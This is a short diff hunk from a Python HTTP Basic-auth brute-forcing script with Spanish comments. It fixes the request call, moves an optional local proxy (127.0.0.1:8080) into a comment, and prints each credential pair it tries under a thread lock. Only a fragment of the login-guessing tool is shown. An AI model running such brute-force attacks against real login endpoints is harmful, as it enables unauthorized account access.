@@ -12,7 +12,7 @@ def brute_force(url, user, password):
 
     header = {'Authorization': f"Basic {base64.b64encode(payload).decode('utf-8')}"}
 
-    r = requests.get(url=url, headers=header, proxies={'http://':'http://127.0.0.1:8080'})
+    r = requests.get(url=url, headers=header) # Para usar proxy añade proxies={'http':'http://127.0.0.1:8080'}
 
     with print_lock:
         print(f'[INFO] Probando credenciales: {user}:{password}')
